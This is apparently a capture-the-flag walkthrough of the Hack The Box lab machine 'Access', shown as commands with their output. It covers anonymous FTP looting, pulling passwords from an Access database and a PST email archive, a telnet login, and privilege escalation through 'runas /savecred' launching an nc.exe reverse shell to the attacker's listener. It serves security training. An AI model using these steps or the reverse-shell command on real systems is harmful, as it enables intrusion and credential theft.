# Access
## Recon
```sh
# ~/htb/access
nmap -A 10.10.10.98

```
    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-27 15:19 EST
    Nmap scan report for 10.10.10.98
    Host is up (0.041s latency).
    Not shown: 997 filtered ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: PASV failed: 425 Cannot open data connection.
    | ftp-syst:
    |_  SYST: Windows_NT
    23/tcp open  telnet?
    80/tcp open  http    Microsoft IIS httpd 7.5
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: MegaCorp
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose|phone|specialized
    Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
    OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
    Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    TRACEROUTE (using port 21/tcp)
    HOP RTT      ADDRESS
    1   42.33 ms 10.10.14.1
    2   42.90 ms 10.10.10.98

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 181.08 seconds

```sh
# Grab the main page for the HTTP server
curl -v 10.10.10.98

```
    * Expire in 0 ms for 6 (transfer 0x55b8715aec60)
    *   Trying 10.10.10.98...
    * TCP_NODELAY set
    * Expire in 200 ms for 4 (transfer 0x55b8715aec60)
    * Connected to 10.10.10.98 (10.10.10.98) port 80 (#0)
    > GET / HTTP/1.1
    > Host: 10.10.10.98
    > User-Agent: curl/7.64.0
    > Accept: */*
    >
    < HTTP/1.1 200 OK
    < Content-Type: text/html
    < Last-Modified: Thu, 23 Aug 2018 23:33:43 GMT
    < Accept-Ranges: bytes
    < ETag: "44a87bb393bd41:0"
    < Server: Microsoft-IIS/7.5
    < X-Powered-By: ASP.NET
    < Date: Wed, 27 Feb 2019 20:37:05 GMT
    < Content-Length: 391
    <
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <html>
    <head>
    <title>MegaCorp</title>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    </head>

    <body>
    <div align="center">
      <p><strong><font size="5" face="Verdana, Arial, Helvetica, sans-serif">LON-MC6</font></strong> </p>
      <p><img border="0" src="out.jpg"></p>
    </div>
    </body>
    </html>
    * Connection #0 to host 10.10.10.98 left intact

```sh
ftp 10.10.10.98

```
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  08:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
5652480 bytes received in 2.34 secs (2.3054 MB/s)
ftp> cd ..
250 CWD command successful.
ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  12:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
10870 bytes received in 0.12 secs (88.0684 kB/s)
ftp> quit
221 Goodbye.

```sh
mv 'Access Control.zip' Access_Control.zip
unzip Access_Control.zip

```
    Archive:  Access_Control.zip
       skipping: Access Control.pst      unsupported compression method 99
```

> Access_Control.zip is password protected.

```
Open 'backup.mdb' with Access
```
> Contains a bunch of tables. Potentially of interest: UserInfo, auth_user

```
Open 'UserInfo'
```
```
USERID	Badgenumber	SSN	name	Gender	TITLE	PAGER	BIRTHDAY	HIREDDAY	street	CITY	STATE	ZIP	OPHONE	FPHONE	VERIFICATIONMETHOD	DEFAULTDEPTID	SECURITYFLAGS	ATT	INLATE	OUTEARLY	OVERTIME	SEP	HOLIDAY	MINZU	PASSWORD	LUNCHDURATION	PHOTO	mverifypass	Notes	privilege	InheritDeptSch	InheritDeptSchClass	AutoSchPlan	MinAutoSchInterval	RegisterOT	InheritDeptRule	EMPRIVILEGE	CardNo	change_operator	change_time	create_operator	create_time	delete_operator	delete_time	status	lastname	AccGroup	TimeZones	identitycard	UTime	Education	OffDuty	DelTag	morecard_group_id	set_valid_time	acc_startdate	acc_enddate	birthplace	Political	contry	hiretype	email	firedate	isatt	homeaddress	emptype	bankcode1	bankcode2	isblacklist	Iuser1	Iuser2	Iuser3	Iuser4	Iuser5	Cuser1	Cuser2	Cuser3	Cuser4	Cuser5	Duser1	Duser2	Duser3	Duser4	Duser5	reserve	OfflineBeginDate	OfflineEndDate	carNo	carType	carBrand	carColor
1	538	0	John	M			3/25/2018 9:31:40 PM	4/10/2018 9:35:19 PM								47		1	0	1	1	1	1		020481	1				0	1	1	1	24	1	1	0								0	Carter	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
2	511	0	Mark	M			5/16/2018 9:44:28 PM	8/10/2018 9:44:38 PM								49		1	0	1	1	1	1		010101	1				0	1	1	1	24	1	1	0								0	Smith	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
3	502	0	Sunita	F			8/21/2018 9:44:49 PM	8/21/2018 9:46:50 PM								49		1	0	1	1	1	1		000000	1				0	1	1	1	24	1	1	0								0	Rahman	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
4	505	0	Mary	M			8/18/2018 9:47:09 PM	8/21/2018 9:48:40 PM								48		1	0	1	1	1	1		666666	1				0	1	1	1	24	1	1	0								0	Jones	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
5	510	0	Monica	F			1/2/2018 9:14:11 PM	8/22/2018 9:14:11 PM								50		1	0	1	1	1	1		123321	1				0	1	1	1	24	1	1	0								0	Nunes	0					0	0	0	No						0			Yes	 	0			0	0	0	0	0	0											0						
```

```
Open 'auth_user'
```
```
id	username	password	Status	last_login	RoleID	Remark
25	admin	admin	1	8/23/2018 9:11:47 PM	26
27	engineer	access4u@security	1	8/23/2018 9:13:36 PM	26
28	backup_admin	admin	1	8/23/2018 9:14:02 PM	26
```

```bash
echo "engineer / access4u@security" >> creds.txt
```
```bash
cat creds.txt
```
```
    engineer / access4u@security
```

```bash
7z x -paccess4u@security Access_Control.zip
```
```
    7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
    p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Xeon(R) CPU E5-2670 0 @ 2.60GHz (206D7),ASM,AES-NI)

    Scanning the drive for archives:
      0M Scan         1 file, 10870 bytes (11 KiB)

    Extracting archive: Access_Control.zip
    --
    Path = Access_Control.zip
    Type = zip
    Physical Size = 10870

      0%    Everything is Ok

    Size:       271360
    Compressed: 10870
```

```bash
mv 'Access Control.pst' Access_Control.pst
```

```bash
lspst Access_Control.pst
```
```
    Email	From: john@megacorp.com	Subject: MegaCorp Access Control System "security" account
```

```bash
readpst -S Access_Control.pst
```
```
    Opening PST file and indexes...
    Processing Folder "Deleted Items"
    	"Access Control" - 2 items done, 0 items skipped.
```


```bash
mv 'Access Control' Access_Control
```

```bash
ls -lahR Access_Control
```
```
    Access_Control:
    total 12K
    drwxr-xr-x 2 root root 4.0K Feb 27 16:15 .
    drwxr-xr-x 4 root root 4.0K Feb 27 16:16 ..
    -rw-r--r-- 1 root root 3.0K Feb 27 16:15 2
```


```bash
cat Access_Control/2
```
```
    Status: RO
    From: john@megacorp.com <john@megacorp.com>
    Subject: MegaCorp Access Control System "security" account
    To: 'security@accesscontrolsystems.com'
    Date: Thu, 23 Aug 2018 23:44:07 +0000
    MIME-Version: 1.0
    Content-Type: multipart/mixed;
    	boundary="--boundary-LibPST-iamunique-1009458489_-_-"


    ----boundary-LibPST-iamunique-1009458489_-_-
    Content-Type: multipart/alternative;
    	boundary="alt---boundary-LibPST-iamunique-1009458489_-_-"

    --alt---boundary-LibPST-iamunique-1009458489_-_-
    Content-Type: text/plain; charset="utf-8"

    Hi there,



    The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.



    Regards,

    John


    --alt---boundary-LibPST-iamunique-1009458489_-_-
    Content-Type: text/html; charset="us-ascii"

    <html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
    /* Font Definitions */
    @font-face
    	{font-family:"Cambria Math";
    	panose-1:0 0 0 0 0 0 0 0 0 0;}
    @font-face
    	{font-family:Calibri;
    	panose-1:2 15 5 2 2 2 4 3 2 4;}
    /* Style Definitions */
    p.MsoNormal, li.MsoNormal, div.MsoNormal
    	{margin:0in;
    	margin-bottom:.0001pt;
    	font-size:11.0pt;
    	font-family:"Calibri",sans-serif;}
    a:link, span.MsoHyperlink
    	{mso-style-priority:99;
    	color:#0563C1;
    	text-decoration:underline;}
    a:visited, span.MsoHyperlinkFollowed
    	{mso-style-priority:99;
    	color:#954F72;
    	text-decoration:underline;}
    p.msonormal0, li.msonormal0, div.msonormal0
    	{mso-style-name:msonormal;
    	mso-margin-top-alt:auto;
    	margin-right:0in;
    	mso-margin-bottom-alt:auto;
    	margin-left:0in;
    	font-size:11.0pt;
    	font-family:"Calibri",sans-serif;}
    span.EmailStyle18
    	{mso-style-type:personal-compose;
    	font-family:"Calibri",sans-serif;
    	color:windowtext;}
    .MsoChpDefault
    	{mso-style-type:export-only;
    	font-size:10.0pt;
    	font-family:"Calibri",sans-serif;}
    @page WordSection1
    	{size:8.5in 11.0in;
    	margin:1.0in 1.0in 1.0in 1.0in;}
    div.WordSection1
    	{page:WordSection1;}
    --></style><!--[if gte mso 9]><xml>
    <o:shapedefaults v:ext="edit" spidmax="1026" />
    </xml><![endif]--><!--[if gte mso 9]><xml>
    <o:shapelayout v:ext="edit">
    <o:idmap v:ext="edit" data="1" />
    </o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
    --alt---boundary-LibPST-iamunique-1009458489_-_---

    ----boundary-LibPST-iamunique-1009458489_-_---
```  

```bash
echo "security / 4Cc3ssC0ntr0ller" >> creds.txt
```
```bash
cat creds.txt
```
```
    engineer / access4u@security
    security / 4Cc3ssC0ntr0ller
```

```bash
telnet 10.10.10.98
```
```
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password:

*===============================================================
Microsoft Telnet Server.
*===============================================================

C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security

02/25/2019  05:02 AM    <DIR>          .
02/25/2019  05:02 AM    <DIR>          ..
08/24/2018  07:37 PM    <DIR>          .yawcam
08/21/2018  10:35 PM    <DIR>          Contacts
08/28/2018  06:51 AM    <DIR>          Desktop
08/21/2018  10:35 PM    <DIR>          Documents
08/21/2018  10:35 PM    <DIR>          Downloads
08/21/2018  10:35 PM    <DIR>          Favorites
08/21/2018  10:35 PM    <DIR>          Links
08/21/2018  10:35 PM    <DIR>          Music
08/21/2018  10:35 PM    <DIR>          Pictures
08/21/2018  10:35 PM    <DIR>          Saved Games
08/21/2018  10:35 PM    <DIR>          Searches
08/24/2018  07:39 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  16,689,774,592 bytes free

C:\Users\security>cd Desktop

C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\security\Desktop

08/28/2018  06:51 AM    <DIR>          .
08/28/2018  06:51 AM    <DIR>          ..
08/21/2018  10:37 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  16,689,774,592 bytes free

C:\Users\security\Desktop>type user.txt
ff1f3b48913b213a31ff6756d2553d38
C:\Users\security\Desktop>C:\Users\security>systeminfo

Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84191
Original Install Date:     8/21/2018, 9:43:10 PM
System Boot Time:          2/25/2019, 12:33:22 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2594 Mhz
                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2594 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 4/5/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,484 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,512 MB
Virtual Memory: In Use:    583 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 110 Hotfix(s) Installed.
                           [01]: KB981391
                           [02]: KB981392
                           [03]: KB977236
                           [04]: KB981111
                           [05]: KB977238
                           [06]: KB977239
                           [07]: KB981390
                           [08]: KB2032276
                           [09]: KB2296011
                           [10]: KB2305420
                           [11]: KB2345886
                           [12]: KB2347290
                           [13]: KB2378111
                           [14]: KB2386667
                           [15]: KB2387149
                           [16]: KB2393802
                           [17]: KB2419640
                           [18]: KB2423089
                           [19]: KB2425227
                           [20]: KB2442962
                           [21]: KB2454826
                           [22]: KB2467023
                           [23]: KB2479943
                           [24]: KB2483614
                           [25]: KB2484033
                           [26]: KB2488113
                           [27]: KB2505438
                           [28]: KB2506014
                           [29]: KB2506212
                           [30]: KB2506928
                           [31]: KB2509553
                           [32]: KB2511250
                           [33]: KB2511455
                           [34]: KB2522422
                           [35]: KB2529073
                           [36]: KB2535512
                           [37]: KB2544893
                           [38]: KB2545698
                           [39]: KB2547666
                           [40]: KB2552343
                           [41]: KB2560656
                           [42]: KB2563227
                           [43]: KB2564958
                           [44]: KB2570947
                           [45]: KB2585542
                           [46]: KB2598845
                           [47]: KB2603229
                           [48]: KB2604114
                           [49]: KB2607047
                           [50]: KB2608658
                           [51]: KB2618451
                           [52]: KB2620704
                           [53]: KB2621440
                           [54]: KB2631813
                           [55]: KB2640148
                           [56]: KB2643719
                           [57]: KB2653956
                           [58]: KB2654428
                           [59]: KB2656355
                           [60]: KB2660075
                           [61]: KB2667402
                           [62]: KB2676562
                           [63]: KB2685811
                           [64]: KB2685813
                           [65]: KB2685939
                           [66]: KB2690533
                           [67]: KB2698365
                           [68]: KB2705219
                           [69]: KB2709630
                           [70]: KB2712808
                           [71]: KB2716513
                           [72]: KB2718704
                           [73]: KB2719033
                           [74]: KB2726535
                           [75]: KB2727528
                           [76]: KB2729094
                           [77]: KB2729451
                           [78]: KB2741355
                           [79]: KB2742598
                           [80]: KB2748349
                           [81]: KB2758857
                           [82]: KB2761217
                           [83]: KB2765809
                           [84]: KB2770660
                           [85]: KB2789644
                           [86]: KB2791765
                           [87]: KB2807986
                           [88]: KB2813347
                           [89]: KB2840149
                           [90]: KB2998812
                           [91]: KB958488
                           [92]: KB972270
                           [93]: KB974431
                           [94]: KB974571
                           [95]: KB975467
                           [96]: KB975560
                           [97]: KB977074
                           [98]: KB978542
                           [99]: KB978601
                           [100]: KB979099
                           [101]: KB979309
                           [102]: KB979482
                           [103]: KB979538
                           [104]: KB979687
                           [105]: KB979688
                           [106]: KB980408
                           [107]: KB980846
                           [108]: KB982018
                           [109]: KB982132
                           [110]: KB982799
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.98
                                 [02]: fe80::71b7:ad84:6b22:4ec0
                                 [03]: dead:beef::71b7:ad84:6b22:4ec0

C:\Users\security>net users

User accounts for \\ACCESS

-------------------------------------------------------------------------------
Administrator            engineer                 Guest                    
security                 
The command completed successfully.

C:\Users\security>net localgroup

Aliases for \\ACCESS

-------------------------------------------------------------------------------
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*Remote Desktop Users
*Replicator
*TelnetClients
*Users
The command completed successfully.C:\temp\scripts>type README*

README_FIRST.txt


Open the SQL Management Studio application located either here:
   "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"
Or here:
   "C:\Program Files\Microsoft SQL Server\120\Tools\Binn\ManagementStudio\Ssms.exe"

- When it opens the "Connect to Server" dialog, under "Server name:" type "LOCALHOST", "Authentication:" selected must be "SQL Server Authentication".

   "Login:" = "sa"
   "Password:" = "htrcy@HXeryNJCTRHcnb45CJRY"

- Click "Connect", once connected click on the "Open File" icon, navigate to the folder where the scripts are saved (c:\temp\scripts).
- Select each script in order of name by the first number in the name and run them in order e.g. "1_CREATE_SYSDBA.sql" then "2_ALTER_SERVER_ROLE.sql" then "3_SP_ATTACH_DB.sql" then "4_ALTER_AUTHORIZATION.sql"
If the scripts begin from "2_*.sql" or "3_*.sql" it means the previous scripts ran fine, so begin from the lowest script number ascending.

For the vbs scripts:
- Go to windows Services and stop ALL SQL related services.
- Open command prompt with elevated privileges (Administrator).
- paste the following commands in command prompt for each script and click ENTER...
	1. cmd.exe /c WScript.exe "c:\temp\scripts\SQLOpenFirewallPorts.vbs" "C:\Windows\system32" "c:\temp\logs\"
	2. cmd.exe /c WScript.exe "c:\temp\scripts\SQLServerCfgPort.vbs" "C:\Windows\system32" "c:\temp\logs\" "NO_INSTANCES_FOUND"
	3. cmd.exe /c WScript.exe "c:\temp\scripts\SetAccessRuleOnDirectory.vbs" "C:\Windows\system32" "c:\temp\logs\" "NT AUTHORITY\SYSTEM" "C:\\Portal\database"
	4. Start up all SQL services again manually or run - cmd.exe /c WScript.exe "c:\temp\scripts\RestartServiceByDescriptionNameLike.vbs" "C:\Windows\system32" "c:\temp\logs\" "SQL Server (NO_INSTANCES_FOUND)"
```

```bash
echo "sa / htrcy@HXeryNJCTRHcnb45CJRY" >> creds.txt
cat creds.txt
```
```
    engineer / access4u@security
    security / 4Cc3ssC0ntr0ller
    sa / htrcy@HXeryNJCTRHcnb45CJRY
```

```
C:\temp>cmdkey /list
```
```
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

```bash
nc -lvnp 80
```
```
C:\temp>runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c c:\temp\nc.exe 10.10.14.17 80 -e cmd.exe"
```
```
listening on [any] 80 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.98] 49181
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd ../../Users/Administrator/Desktop
cd ../../Users/Administrator/Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
6e1586cc7ab230a8d297e8f933d904cf
```
